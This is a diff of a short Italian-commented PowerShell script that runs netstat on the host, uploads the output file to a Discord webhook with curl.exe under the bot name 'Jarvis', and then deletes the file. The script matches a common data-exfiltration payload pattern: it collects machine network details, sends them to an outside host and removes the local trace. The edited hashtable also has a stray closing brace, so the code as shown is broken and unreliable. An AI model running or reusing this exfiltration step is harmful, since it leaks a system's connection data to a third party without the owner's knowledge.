@@ -1,28 +1,19 @@
-# Imposta il percorso del file in cui salvare l'output di netstat
-$scriptPath = $MyInvocation.MyCommand.Path
-$scriptDirectory = Split-Path $scriptPath
-$filePath = Join-Path $scriptDirectory "netstat_output.txt"
-
+# Ricordati di dichiarare la variabile $webhook con il link discord
 # Esegue il comando netstat e salva l'output nel file specificato
-netstat > $filePath
+echo "NETSTAT OUTPUT" > netstat.txt
+netstat >> netstat.txt
 
 # Contenuto del messaggio Discord
 $message = "Output di netstat:"
 
-# Converti il contenuto del file in Base64
-$fileContentBase64 = [Convert]::ToBase64String((Get-Content -Path $filePath -Raw -Encoding UTF8))
-
 # Creazione dei dati da inviare al webhook
 $data = @{
+    name = "Jarvis"
     content = $message
-    file = @{
-        name = "netstat_output.txt"
-        content = $fileContentBase64
     }
 } | ConvertTo-Json
 
 # Invia il messaggio Discord tramite Invoke-RestMethod
 Invoke-RestMethod -Uri $webhook -Method Post -Body $data -ContentType "application/json"
-
-# Elimina il file dopo l'invio (se necessario)
-Remove-Item $filePath
+curl.exe -F "file1=@netstat.txt" $webhook
+Remove-Item '.\netstat.txt'
